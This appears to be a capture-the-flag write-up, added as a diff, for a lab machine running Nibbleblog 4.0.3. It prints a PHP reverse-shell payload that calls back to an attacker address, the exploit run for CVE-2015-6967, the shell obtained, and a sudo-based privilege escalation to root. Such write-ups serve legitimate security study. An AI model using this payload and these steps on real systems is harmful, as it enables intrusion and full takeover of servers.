@@ -1,0 +1,53 @@
+
+
+Hello World!
+html source code:
+<b>Hello world!</b>
+...
+<!-- /nibbleblog/ directory. Nothing interesting here! -->
+
+
+http://10.10.10.75/nibbleblog/README
+
+====== Nibbleblog ======
+Version: v4.0.3
+Codename: Coffee
+Release date: 2014-04-01
+
+Nibbleblog 4.0.3 - Arbitrary File Upload (CVE-2015-6967)
+
+┌──(kali㉿kali)-[~]
+└─$ cat shell.php         
+<?php exec('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.11/4444 0>&1"'); ?>
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ python3 nibble_exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php
+[+] Login Successful.
+[+] Upload likely successfull.
+[+] Exploit launched, check for shell.
+                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 4444                                                                              
+listening on [any] 4444 ...
+connect to [10.10.14.11] from (UNKNOWN) [10.10.10.75] 51928
+bash: cannot set terminal process group (1342): Inappropriate ioctl for device
+bash: no job control in this shell
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ 
+nibbler@Nibbles:/home/nibbler$ sudo -l
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+
+Privilege Escalation Steps:
+1. Create the required directory and script from the reverse shell:
+    mkdir -p /home/nibbler/personal/stuff
+    echo '#!/bin/bash\n/bin/bash -i' > /home/nibbler/personal/stuff/monitor.sh
+    chmod +x /home/nibbler/personal/stuff/monitor.sh
+
+2. Spawn a root shell:
+    sudo /home/nibbler/personal/stuff/monitor.sh
+
+This grants a root shell due to the sudoers configuration.
